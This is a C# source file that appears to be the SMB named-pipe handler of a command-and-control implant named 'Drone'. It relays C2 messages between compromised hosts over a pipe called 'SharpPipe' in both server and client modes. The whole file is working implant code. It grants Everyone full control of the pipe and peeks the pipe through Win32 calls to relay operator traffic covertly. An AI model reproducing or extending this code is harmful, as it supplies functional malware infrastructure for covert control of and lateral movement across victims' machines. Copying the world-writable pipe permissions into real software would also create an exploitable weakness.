using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Handlers;

public sealed class SmbHandler : Handler
{
    public override event Func<IEnumerable<C2Message>, Task> OnMessagesReceived;
    
    private readonly HandlerMode _mode;
    private readonly string _target;
    private readonly string _pipeName;
    
    private PipeStream _pipeStream;
    private CancellationTokenSource _tokenSource;
    
    private readonly ManualResetEvent _signal = new(false);

    public SmbHandler()
    {
        _pipeName = PipeName;
        _mode = HandlerMode.Server;
    }

    public SmbHandler(string target, string pipeName)
    {
        _target = target;
        _pipeName = pipeName;
        _mode = HandlerMode.Client;
    }

    public async Task Connect()
    {
        // only when in client mode
        var client = new NamedPipeClientStream(_target, _pipeName);
        var token = new CancellationTokenSource(new TimeSpan(0, 0, 30));
        
        await client.ConnectAsync(token.Token);
        client.ReadMode = PipeTransmissionMode.Message;

        _pipeStream = client;
    }
    
    public override async Task Start()
    {
        _tokenSource = new CancellationTokenSource();
        
        switch (_mode)
        {
            case HandlerMode.Client:
            {
                await HandlePipeStream();
                break;
            }

            case HandlerMode.Server:
            {
                await RunServer();
                break;
            }

            default:
                throw new ArgumentOutOfRangeException();
        }
        
        _pipeStream?.Dispose();
    }

    private async Task RunServer()
    {
        var ps = new PipeSecurity();
        var identity = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
        ps.AddAccessRule(new PipeAccessRule(identity, PipeAccessRights.FullControl, AccessControlType.Allow));
                
        var server = new NamedPipeServerStream(PipeName, PipeDirection.InOut,
            NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message,
            PipeOptions.Asynchronous, 2048, 2048, ps);

        while (!_tokenSource.IsCancellationRequested)
        {
            _signal.Reset();
            
            // blocks until client connects
            await server.WaitForConnectionAsync(_tokenSource.Token);
            _pipeStream = server;
            
            await HandlePipeStream();
            
            _signal.WaitOne();
        }
    }

    private async Task HandlePipeStream()
    {
        _signal.Set();

        while (!_tokenSource.IsCancellationRequested)
        {
            // read if there's data
            uint toRead = 0;
            if (Win32.PeekNamedPipe(_pipeStream.SafePipeHandle.DangerousGetHandle(), ref toRead))
            {
                if (toRead > 0)
                {
                    var inbound = await _pipeStream.ReadStream();
                    var messages = inbound.Deserialize<IEnumerable<C2Message>>();

                    OnMessagesReceived?.Invoke(messages);
                }
            }

            await Task.Delay(10);
        }
    }

    public override async Task SendMessages(IEnumerable<C2Message> messages)
    {
        await _pipeStream.WriteStream(messages.Serialize());
    }

    public override void Stop()
    {
        _tokenSource.Cancel();
        _tokenSource.Dispose();
    }

    private static string PipeName => "SharpPipe";
}